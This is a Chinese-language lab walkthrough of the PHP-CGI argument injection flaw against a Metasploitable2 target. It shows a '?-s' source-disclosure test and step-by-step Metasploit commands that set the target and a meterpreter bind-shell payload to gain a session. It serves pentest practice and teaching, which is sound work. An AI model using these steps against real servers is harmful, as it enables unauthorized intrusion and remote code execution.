## PHP CGI Argument Injection Exploit
当PHP以特定的CGI方式被调用时（例如Apache的mod_cgid），php-cgi接收处理过的查询格式字符串作为命令行参数，允许命令行开关（例如-s、-d 或-c）传递到php-cgi程序，导致源代码泄露和任意代码执行。FastCGI不受影响.

0x00、工具
- metasploit4
- uniscan

0x01、现在浏览web应用程序，发现有好几个web程序，先用uniscan扫一下试试，结果发现了一个phpinfo的uri，已知web跑在apache上的，所以测试一下上面的漏洞,
测试uri `phpinfo?-s`看看是不是会显示源代码，结果很明显，源代码显示出来了：
```php
<?php
    phpinfo()
?>
```

0x02、直接进入metasploit4控制台搜索`php-cgi`就会找到这个漏洞的利用。
```bash
[root@kali: ~#] msfconsole
msf > search php-cgi
Matching Modules
================

   Name                                      Disclosure Date  Rank       Description
   ----                                      ---------------  ----       -----------
   exploit/multi/http/php_cgi_arg_injection  2012-05-03       excellent  PHP CGI Argument Injection
```

0x03、设置RHOST、TARGETURI、payload
```bash
msf exploit(php_cgi_arg_injection) > show options
Module options (exploit/multi/http/php_cgi_arg_injection):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   PLESK        false            yes       Exploit Plesk
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                         yes       The target address
   RPORT        80               yes       The target port
   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
   VHOST                         no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(php_cgi_arg_injection) > show payloads 

Compatible Payloads
===================

   Name                           Disclosure Date  Rank    Description
   ----                           ---------------  ----    -----------
   generic/custom                                  normal  Custom Payload
   generic/shell_bind_tcp                          normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                       normal  Generic Command Shell, Reverse TCP Inline
   php/bind_perl                                   normal  PHP Command Shell, Bind TCP (via Perl)
   php/bind_perl_ipv6                              normal  PHP Command Shell, Bind TCP (via perl) IPv6
   php/bind_php                                    normal  PHP Command Shell, Bind TCP (via PHP)
   php/bind_php_ipv6                               normal  PHP Command Shell, Bind TCP (via php) IPv6
   php/download_exec                               normal  PHP Executable Download and Execute
   php/exec                                        normal  PHP Execute Command 
   php/meterpreter/bind_tcp                        normal  PHP Meterpreter, Bind TCP Stager
   php/meterpreter/bind_tcp_ipv6                   normal  PHP Meterpreter, Bind TCP Stager IPv6
   php/meterpreter/reverse_tcp                     normal  PHP Meterpreter, PHP Reverse TCP Stager
   php/meterpreter_reverse_tcp                     normal  PHP Meterpreter, Reverse TCP Inline
   php/reverse_perl                                normal  PHP Command, Double Reverse TCP Connection (via Perl)
   php/reverse_php                                 normal  PHP Command Shell, Reverse TCP (via PHP)
msf exploit(php_cgi_arg_injection) > set RHOST metasploitable2
msf exploit(php_cgi_arg_injection) > set TARGETURI /phpinfo.php
#设置载荷
msf exploit(php_cgi_arg_injection) > set payload php/meterpreter/bind_tcp
msf exploit(php_cgi_arg_injection) > exploit
#进入meterpreter
meterpreter > help
```
0x04、剩下的操作，都懂的撒。

0x05、其实完成这个漏洞利用，uniscan还没扫描完~等着！！！！！！